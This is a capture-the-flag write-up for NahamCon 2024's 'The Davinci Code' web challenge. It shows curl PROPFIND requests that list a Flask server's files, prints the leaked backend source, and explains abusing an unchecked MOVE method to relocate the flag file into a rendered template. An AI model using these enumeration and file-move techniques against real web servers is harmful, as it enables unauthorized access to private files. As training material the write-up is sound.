---
layout: load_md
title: The White Circle | Nahamcon 2024 | The Davinci Code Writeup
desc: "The White Circle is a community for Cyber/Information Security students, enthusiasts and professionals. You can discuss anything related to Security, share your knowledge with others, get help when you need it and proceed further in your journey with amazing people from all over the world."
image: images/twc_og_banner.jpg
ctf: Nahamcon 2024
parent: nahamcon_2024
category: web
challenge: The Davinci Code
tags: "web, twh, http methods"
date: 2024-05-28T00:00:00+00:00
last_modified_at: 2024-05-28T00:00:00+00:00
---

<h1 class="heading card-title white-text">Nahamcon 2024</h1>


## The Davinci Code
> Solved by : thewhiteh4t


- In this challenge the application is a simple flask website with two public endpoints
- `/code` and `/static/<filename>`
- `/code` is supposed to render `code.html` but it looks like that file is not present so we are presented with werkzeug debug page
- After some basic recon of the application we can see that an interesting HTTP method is available :


![](https://i.imgur.com/hxDQfxO.png)

- PROPFIND — used to retrieve properties, stored as XML, from a web resource. It is also overloaded to allow one to retrieve the collection structure (a.k.a. directory hierarchy) of a remote system.
- https://learn.microsoft.com/en-us/previous-versions/office/developer/exchange-server-2003/aa142960(v=exchg.65)
- So using PROPFIND with curl we can actually get the file listing on the server!


![](https://i.imgur.com/T6rNf2L.png)

```xml
<D:multistatus
        xmlns:D="DAV:">
        <D:response>
                <D:href>/</D:href>
                <D:propstat>
                        <D:prop>
                                <D:message>WebDAVinci Code</D:message>
                                <D:directory>True</D:directory>
                        </D:prop>
                        <D:status>HTTP/1.1 200 OK</D:status>
                </D:propstat>
        </D:response>
        <D:response>
                <D:href>/__pycache__</D:href>
                <D:propstat>
                        <D:prop>
                                <D:displayname>__pycache__</D:displayname>
                        </D:prop>
                        <D:status>HTTP/1.1 200 OK</D:status>
                </D:propstat>
        </D:response>
        <D:response>
                <D:href>/templates</D:href>
                <D:propstat>
                        <D:prop>
                                <D:displayname>templates</D:displayname>
                        </D:prop>
                        <D:status>HTTP/1.1 200 OK</D:status>
                </D:propstat>
        </D:response>
        <D:response>
                <D:href>/app.py</D:href>
                <D:propstat>
                        <D:prop>
                                <D:displayname>app.py</D:displayname>
                        </D:prop>
                        <D:status>HTTP/1.1 200 OK</D:status>
                </D:propstat>
        </D:response>
        <D:response>
                <D:href>/static</D:href>
                <D:propstat>
                        <D:prop>
                                <D:displayname>static</D:displayname>
                        </D:prop>
                        <D:status>HTTP/1.1 200 OK</D:status>
                </D:propstat>
        </D:response>
        <D:response>
                <D:href>/the_secret_dav_inci_code</D:href>
                <D:propstat>
                        <D:prop>
                                <D:displayname>the_secret_dav_inci_code</D:displayname>
                        </D:prop>
                        <D:status>HTTP/1.1 200 OK</D:status>
                </D:propstat>
        </D:response>
</D:multistatus>
```

- immediately we can see `/the_secret_dav_inci_code`, here is what happens if we request PROPFIND on this path :

```
> curl -X PROPFIND http://challenge.nahamcon.com:30365/the_secret_dav_inci_code
<D:multistatus xmlns:D="DAV:"><D:response><D:href>/the_secret_dav_inci_code</D:href><D:propstat><D:prop><D:message>WebDAVinci Code</D:message><D:directory>True</D:directory></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response><D:response><D:href>/the_secret_dav_inci_code/flag.txt</D:href><D:propstat><D:prop><D:displayname>flag.txt</D:displayname></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response></D:multistatus>
```

```xml
<D:multistatus
        xmlns:D="DAV:">
        <D:response>
                <D:href>/the_secret_dav_inci_code</D:href>
                <D:propstat>
                        <D:prop>
                                <D:message>WebDAVinci Code</D:message>
                                <D:directory>True</D:directory>
                        </D:prop>
                        <D:status>HTTP/1.1 200 OK</D:status>
                </D:propstat>
        </D:response>
        <D:response>
                <D:href>/the_secret_dav_inci_code/flag.txt</D:href>
                <D:propstat>
                        <D:prop>
                                <D:displayname>flag.txt</D:displayname>
                        </D:prop>
                        <D:status>HTTP/1.1 200 OK</D:status>
                </D:propstat>
        </D:response>
</D:multistatus>
```

- so now we know where the flag is but PROPFIND does not let us read files so we need to enumerate more…


```
> curl -X PROPFIND http://challenge.nahamcon.com:30365/templates
<D:multistatus xmlns:D="DAV:"><D:response><D:href>/templates</D:href><D:propstat><D:prop><D:message>WebDAVinci Code</D:message><D:directory>True</D:directory></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response><D:response><D:href>/templates/index.html</D:href><D:propstat><D:prop><D:displayname>index.html</D:displayname></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response></D:multistatus>
```

- so we can see that `code.html` is missing under templates directory

```
> curl -X PROPFIND http://challenge.nahamcon.com:30365/static
<D:multistatus xmlns:D="DAV:"><D:response><D:href>/static</D:href><D:propstat><D:prop><D:message>WebDAVinci Code</D:message><D:directory>True</D:directory></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response><D:response><D:href>/static/logo01.png</D:href><D:propstat><D:prop><D:displayname>logo01.png</D:displayname></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response><D:response><D:href>/static/app.py.backup</D:href><D:propstat><D:prop><D:displayname>app.py.backup</D:displayname></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response></D:multistatus>
```

- juicy file spotted : `/static/app.py.backup` !!

```python
from flask import Flask, request, Response, render_template, abort, send_from_directory
import xml.etree.ElementTree as ET
import os
import shutil

app = Flask(__name__)
os.makedirs('static', exist_ok=True)

@app.route('/static/<path:filename>')
def static_files(filename):
    return send_from_directory('static', filename)

def create_webdav_response(endpoint, properties, children=None):
    root = ET.Element('D:multistatus', {'xmlns:D': 'DAV:'})
    response = ET.SubElement(root, 'D:response')
    href = ET.SubElement(response, 'D:href')
    href.text = endpoint
    propstat = ET.SubElement(response, 'D:propstat')
    prop = ET.SubElement(propstat, 'D:prop')
    for key, value in properties.items():
        element = ET.SubElement(prop, f'D:{key}')
        element.text = value
    status = ET.SubElement(propstat, 'D:status')
    status.text = 'HTTP/1.1 200 OK'

    if children:
        for child in children:
            child_response = ET.SubElement(root, 'D:response')
            child_href = ET.SubElement(child_response, 'D:href')
            child_href.text = os.path.join(endpoint, child)
            child_propstat = ET.SubElement(child_response, 'D:propstat')
            child_prop = ET.SubElement(child_propstat, 'D:prop')
            child_name = ET.SubElement(child_prop, 'D:displayname')
            child_name.text = child
            child_status = ET.SubElement(child_propstat, 'D:status')
            child_status.text = 'HTTP/1.1 200 OK'

    return ET.tostring(root, encoding='utf-8', method='xml')

@app.route('/<path:path>', methods=['GET', 'PROPFIND', 'MOVE'])
def handle_webdav(path):
    full_path = os.path.join(os.getcwd(), path)
    if request.method == 'PROPFIND':
        if os.path.exists(full_path):
            properties = {'message': 'WebDAVinci Code'}
            children = None
            if os.path.isdir(full_path):
                properties['directory'] = 'True'
                children = os.listdir(full_path)
            else:
                properties['file'] = 'True'
            xml_response = create_webdav_response('/' + path, properties, children)
            return Response(xml_response, mimetype='application/xml')
        abort(404)
    elif request.method == 'MOVE':
        destination = request.headers.get('Destination')
        if destination:
            destination_path = os.path.join(os.getcwd(), destination.strip('/'))
            os.makedirs(os.path.dirname(destination_path), exist_ok=True)
            shutil.move(full_path, destination_path)
            return Response(status=204)
        abort(405)
    abort(404)

@app.route('/code')
def code():
    return render_template("code.html")

@app.route('/', methods=['GET', 'PROPFIND'])
def index():
    if request.method == 'GET':
        return render_template('index.html')
        
    elif request.method == 'PROPFIND':
        properties = {'message': 'WebDAVinci Code'}
        children = None
        properties['directory'] = 'True'
        children = os.listdir(os.getcwd())
        xml_response = create_webdav_response('/', properties, children)
        return Response(xml_response, mimetype='application/xml')
    else:
        abort(405)


if __name__ == '__main__':
    app.run(debug=True, port=5000)
```


- and now we know all the routes and how the backend is handling inputs
- we can see another method `MOVE`

```python
elif request.method == 'MOVE':
        destination = request.headers.get('Destination')
        if destination:
            destination_path = os.path.join(os.getcwd(), destination.strip('/'))
            os.makedirs(os.path.dirname(destination_path), exist_ok=True)
            shutil.move(full_path, destination_path)
            return Response(status=204)
```

- we can add `Destination` header in our curl request and it looks like we can move files around using this method
- now if we recall `code.html` is missing, so we can move `/the_secret_dav_inci_code/flag.txt` to `templates/code.html`
- since we already have a defined route `/code` which renders `code.html` we should be able to read flag.txt


![](https://i.imgur.com/1qjXLSI.png)

- now lets look at `/code`


![](https://i.imgur.com/XheR1JI.png)



